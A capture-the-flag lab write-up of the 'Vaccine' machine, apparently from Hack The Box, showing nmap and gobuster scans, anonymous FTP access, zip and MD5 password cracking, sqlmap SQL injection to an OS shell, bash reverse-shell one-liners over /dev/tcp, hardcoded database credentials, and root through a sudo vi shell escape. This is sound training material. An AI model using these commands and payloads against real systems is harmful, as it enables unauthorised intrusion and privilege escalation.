#veryeasy #vulnerabilityAssessment #customApplications #sourceCodeAnalysis #apache #posthreSQL #FTP #passwordCracking #SUDOExploitation #SQLInjection #RCE #clearTextCredentials #anonymousAccess #linux

## 0. **Lab infos**

**Difficulty :** Very easy
**Name :** Vaccine
**IP** : 10.129.11.179
**Objectives :** Get user and root flags
**OS :** Linux

##### **Conclusion**
**Time :** 2h06
	**Start :** 19:07
	**Break at/to :** 19:16 - 20:50
	**Finish :** 22:47
**Satisfaction :** 5/10 because I need help for the reverse shell and for privileges escalation

## 1. **Reconnaissance

With the scan of #nmap we see this :

```SHELL
┌─[eu-starting-point-2-dhcp]─[10.10.15.56]─[bobinette@htb-ktojmy4srl]─[~]
└──╼ [★]$ nmap 10.129.11.179 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 12:07 CST
Nmap scan report for 10.129.11.179
Host is up (0.012s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The port 21 is open for ftp, 22 for ssh and 80 for http, so there's probably a website.

On the website web can see a login page to MegaCorp :

![[Pasted image 20250115205246.png]]

With #gobuster we discovered some pages :

```SHELL
┌─[eu-starting-point-2-dhcp]─[10.10.15.56]─[bobinette@htb-ktojmy4srl]─[~]
└──╼ [★]$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.11.179 -x txt,html,php,conf,config,bdd
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.11.179
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              conf,config,bdd,txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 2312]
/.php                 (Status: 403) [Size: 278]
/license.txt          (Status: 200) [Size: 1100]
/dashboard.php        (Status: 302) [Size: 931] [--> index.php]
Progress: 436036 / 1543927 (28.24%)
```

## 2. Weaponization

## 3. Delivery

## 4. Exploitation

Let's try to connect to the FTP via anonymous access.

```SHELL
┌─[eu-starting-point-2-dhcp]─[10.10.15.56]─[bobinette@htb-ktojmy4srl]─[~]
└──╼ [★]$ ftp anonymous@10.129.11.179
Connected to 10.129.11.179.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

It's work and we discover a `backup.zip` file.

```SHELL
ftp> ls
229 Entering Extended Passive Mode (|||10018|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> 
```

So we download the file :
```SHELL
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10990|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |**********************************************************|  2533      609.11 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (212.83 KiB/s)
```

When we try to extract the file we see that we need a password :

![[Pasted image 20250115210426.png]]

With a #John script we create a hash file :

```SHELL
zip2john /home/bobinette/backup.zip > hash_file.txt
```

And we brut force the hash :

```SHELL
john --wordlist=/usr/share/wordlists/rockyou.txt hash_file.txt
```

Output :

```SHELL
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2025-01-15 14:15) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password is `741852963`

In the .zip file we have an `index.php` file and a `style.css`

`index.php` contains :

```PHP
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>MegaCorp Login</title>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">

</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
<!-- partial:index.partial.html -->
<body class="align">

  <div class="grid">

    <form action="" method="POST" class="form login">

      <div class="form__field">
        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
      </div>

      <div class="form__field">
        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
      </div>

      <div class="form__field">
        <input type="submit" value="Sign In">
      </div>

    </form>


  </div>

  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>

</body>
<!-- partial -->
  
</body>
</html>
```

We can see the password for `admin` is `2cb42f8734ea607eefed3b70af13bbd3` but it's a md5 hash so we put them on crack station and we get : `qwerty789`
Let's try on the website.

![[Pasted image 20250115212149.png]]

It's work.

When we put an `'` in the search bar we get :
```SQL
ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
```
The web page is vulnerable to sql injection.

Go try #sqlmap

```SHELL
sqlmap -u "http://10.129.11.179/dashboard.php?search=e" --os-shell
```

The website redirect us to the `index.php` because we aren't logged so go put the PHPSESSID cookie of our admin account in the command :

```SHELL
sqlmap -u "http://10.129.11.179/dashboard.php?search=e" --os-shell --cookie="PHPSESSID=upjm3aapshdfdd5lhtr2b01t6i
```

We enter `Y` `Y` and `N`for the 3 question and there is our shell :
```SHELL
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=e' AND (SELECT (CASE WHEN (5877=5877) THEN NULL ELSE CAST((CHR(121)||CHR(81)||CHR(110)||CHR(90)) AS NUMERIC) END)) IS NULL-- BDUs

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=e' AND 7033=CAST((CHR(113)||CHR(122)||CHR(118)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (7033=7033) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(106)||CHR(120)||CHR(113)) AS NUMERIC)-- tXeJ

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=e';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=e' AND 4479=(SELECT 4479 FROM PG_SLEEP(5))-- NOqU
---
[14:39:07] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[14:39:08] [INFO] fingerprinting the back-end DBMS operating system
[14:39:08] [INFO] the back-end DBMS operating system is Linux
[14:39:08] [INFO] testing if current user is DBA
[14:39:08] [INFO] retrieved: '1'
[14:39:08] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[14:39:08] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
```


With an `whoami` command we see that we are the user `postgres`

```SHELL
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[14:40:45] [INFO] retrieved: 'postgres'
command standard output: 'postgres'
os-shell> 
```

In `/home` we see that we have 2 user : `ftpuser` and `simon`.
We cannot see the folder of `simon`.

## 5. Installation

Now we create a reverse shell :

```SHELL
┌─[eu-starting-point-2-dhcp]─[10.10.15.56]─[bobinette@htb-ktojmy4srl]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
```

``` Bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&10<&196;
exec 196<>/dev/tcp/10.0.0.1/4242;
sh <&196 >&196 2>&196 /bin/bash -1 > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
bash -c "bash -i >& /dev/tcp/10.10.15.56/4444 0>&1"
```

And there we are :

![[Pasted image 20250115221017.png]]

But he always close. But we just have time to read `dashboard.php` in /var/www/html. He contains :

```PHP
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard</title>
  <link rel="stylesheet" href="./dashboard.css">
  <script src="https://use.fontawesome.com/33a3739634.js"></script>

</head>
<body>
<!-- partial:index.partial.html -->
<body>
 <div id="wrapper">
 <div class="parent">
  <h1 align="left">MegaCorp Car Catalogue</h1>
<form action="" method="GET">
<div class="search-box">
  <input type="search" name="search" placeholder="Search" />
  <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
</div>
</form>
  </div>
  
  <table id="keywords" cellspacing="0" cellpadding="0">
    <thead>
      <tr>
        <th><span style="color: white">Name</span></th>
        <th><span style="color: white">Type</span></th>
        <th><span style="color: white">Fuel</span></th>
        <th><span style="color: white">Engine</span></th>
      </tr>
    </thead>
    <tbody>
	<?php
	session_start();
	if($_SESSION['login'] !== "true") {
	  header("Location: index.php");
	  die();
	}
	try {
	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
	}

	catch ( exception $e ) {
	  echo $e->getMessage();
	}

	if(isset($_REQUEST['search'])) {

	  $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";

	  $result = pg_query($conn,$q);

	  if (!$result)
	  {
			    die(pg_last_error($conn));
	  }
	  while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
	      {
		echo "
		  <tr>
		    <td class='lalign'>$row[1]</td>
		    <td>$row[2]</td>
		    <td>$row[3]</td>
		    <td>$row[4]</td>
		  </tr>";
	    }
	}
	else {
		
	  $q = "Select * from cars";

	  $result = pg_query($conn,$q);

	  if (!$result)
	  {
			    die(pg_last_error($conn));
	  }
	  while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
	      {
		echo "
		  <tr>
		    <td class='lalign'>$row[1]</td>
		    <td>$row[2]</td>
		    <td>$row[3]</td>
		    <td>$row[4]</td>
		  </tr>";
	    }
	}


      ?>
    </tbody>
  </table>
 </div> 
</body>
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="./dashboard.js"></script>

</body>
</html>

```

## 6. Command and Control

We can see that the variable `$conn` contains the password of `postgres` and is `P@s5w0rd!`.
So let's go connect to ssh :

```SHELL
┌─[eu-starting-point-2-dhcp]─[10.10.15.56]─[bobinette@htb-ktojmy4srl]─[~]
└──╼ [★]$ ssh postgres@10.129.11.179
postgres@10.129.11.179's password: P@s5w0rd!
```

It's working

```SHELL
postgres@vaccine:~$ ls
11  user.txt
```

hehe boyyyy

```SHELL
postgres@vaccine:~$ cat user.txt 
ec9b13ca4d6229cd5cc1e09980965bf7
```

user flag is : `ec9b13ca4d6229cd5cc1e09980965bf7`

Now we want root privilege so let's go make an `sudo -l` for see if we can do something

```SHELL
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

We need to edit the config file using vi.

```SHELL
postgres@vaccine:~$ /bin/vi /etc/postgresql/11/main//pg_hba.conf
```

Now press `esc` we write `:!/bin/bash` in the file

```SHELL
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main//pg_hba.conf
```

And we are root :

![[Pasted image 20250115224619.png]]

Go to `/root` and read the `root.txt` file.

`dd6e058e814260bc70e9bbdef2715849`